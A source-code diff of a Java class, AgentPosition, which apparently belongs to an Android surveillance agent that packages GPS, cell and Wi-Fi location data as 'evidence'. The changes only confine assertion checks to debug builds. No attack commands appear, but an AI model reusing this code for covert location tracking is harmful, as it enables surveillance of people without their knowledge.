@@ -95,8 +95,8 @@ public class AgentPosition extends AgentBase implements LocationListener {
 			cellEnabled = ((type & TYPE_CELL) != 0);
 			wifiEnabled = ((type & TYPE_WIFI) != 0);
 
-			Check.asserts(period > 0, "parse period: " + period);
-			// Check.asserts(type == 1 || type == 2 || type == 4, "parse type: "
+			if(Cfg.DEBUG) Check.asserts(period > 0, "parse period: " + period);
+			// if(Cfg.DEBUG) Check.asserts(type == 1 || type == 2 || type == 4, "parse type: "
 			// + type);
 
 
@@ -277,7 +277,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 		addbuffer.writeInt(type);
 		addbuffer.writeInt(structNum);
 
-		Check.ensures(addbuffer.getPosition() == addsize,
+		if(Cfg.DEBUG) Check.ensures(addbuffer.getPosition() == addsize,
 				"addbuffer wrong size");
 
 
@@ -286,7 +286,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 
 	private byte[] messageEvidence(byte[] payload, int type) {
 
-		Check.requires(payload != null, "saveEvidence payload!= null");
+		if(Cfg.DEBUG) Check.requires(payload != null, "saveEvidence payload!= null");
 
 
 		if(Cfg.DEBUG) Log.d("QZ", TAG + " saveEvidence payload: " + payload.length);
@@ -314,7 +314,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 		// delimiter
 		databuffer.writeInt(Evidence.EVIDENCE_DELIMITER);
 
-		Check.ensures(databuffer.getPosition() == size,
+		if(Cfg.DEBUG) Check.ensures(databuffer.getPosition() == size,
 				"saveEvidence wrong size");
 
 
@@ -339,7 +339,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 			// + Utils.byteArrayToHex(token));
 
 
-			Check.asserts(token.length == 1, "getWifiPayload: token wrong size");
+			if(Cfg.DEBUG) Check.asserts(token.length == 1, "getWifiPayload: token wrong size");
 
 			databuffer.writeByte(token[0]);
 		}
@@ -364,18 +364,18 @@ public class AgentPosition extends AgentBase implements LocationListener {
 
 		databuffer.writeInt(signalLevel);
 
-		Check.ensures(databuffer.getPosition() == size,
+		if(Cfg.DEBUG) Check.ensures(databuffer.getPosition() == size,
 				"databuffer.getPosition wrong size");
 
 
-		Check.ensures(payload.length == size, "payload wrong size");
+		if(Cfg.DEBUG) Check.ensures(payload.length == size, "payload wrong size");
 
 
 		return payload;
 	}
 
 	private byte[] getCellPayload(CellInfo info, int logType) {
-		Check.requires(info.valid, "invalid cell info");
+		if(Cfg.DEBUG) Check.requires(info.valid, "invalid cell info");
 
 		final int size = 19 * 4 + 48 + 16;
 		final byte[] cellPosition = new byte[size];
@@ -411,7 +411,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 		databuffer.write(new byte[48]); // BCCH
 		databuffer.write(new byte[16]); // NMR
 
-		Check.ensures(databuffer.getPosition() == size,
+		if(Cfg.DEBUG) Check.ensures(databuffer.getPosition() == size,
 				"getCellPayload wrong size");
 
 
@@ -496,7 +496,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 		if(Cfg.DEBUG) Log.d("QZ", TAG + " len: " + databuffer.getPosition());
 
 
-		Check.ensures(databuffer.getPosition() == size,
+		if(Cfg.DEBUG) Check.ensures(databuffer.getPosition() == size,
 				"saveGPSLog wrong size: " + databuffer.getPosition());
 
 
